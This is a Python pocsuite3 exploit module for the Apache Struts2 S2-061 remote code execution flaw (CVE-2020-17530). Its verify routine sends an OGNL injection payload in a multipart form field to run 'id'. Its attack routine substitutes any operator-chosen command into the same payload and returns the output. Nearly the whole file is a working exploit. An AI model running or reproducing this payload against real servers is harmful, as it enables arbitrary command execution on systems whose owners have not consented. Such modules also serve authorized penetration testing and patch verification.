# -*- coding:utf-8 -*-

from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, OptString
import re

class DemoPOC(POCBase):
    vulID = "CVE-2020-17530"
    version ='1'
    author = ["LMX"]
    vulDate = "2017-09-22"
    createDate = "2022-2-22"
    updateDate = "2022-2-22"
    references =["vulfocus/struts2-cve_2020_17530:latest"]
    name ="S2-061 Remote Code Execution Vulnerablity"
    appPowerLink = ''
    appName = 'Struts2'
    appVersion = 'struts 2.0.0 - struts 2.5.25'
    vulType = 'RCE'
    desc = '''
    struts2-061远程代码执行漏洞
    '''
    
    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        result ={}
        payload = """
            ------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{\r\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))\r\n}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
            """
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'multipart/form-data;',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36',
                    'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF'
                    }
        r = requests.post(url=self.url,headers=headers,data=payload)

        try:
            if r.status_code == 200 and 'uid' in r.text and 'gid' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):

        result ={}

        cmd = self.get_option("command")
        payload = """
            ------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{\r\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'RECOMMAND'}))\r\n}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
            """
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'multipart/form-data;',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36',
                    'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF'
                    }
        payload = payload.replace("RECOMMAND", cmd)

        try:
            response = requests.post(url=self.url, data=payload, headers=headers,timeout=5)
            if response and response.status_code == 200:
                str = response.text
                result['Stdout'] = re.findall(r"id(.*?)\n",str)
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)
        
register_poc(DemoPOC) 
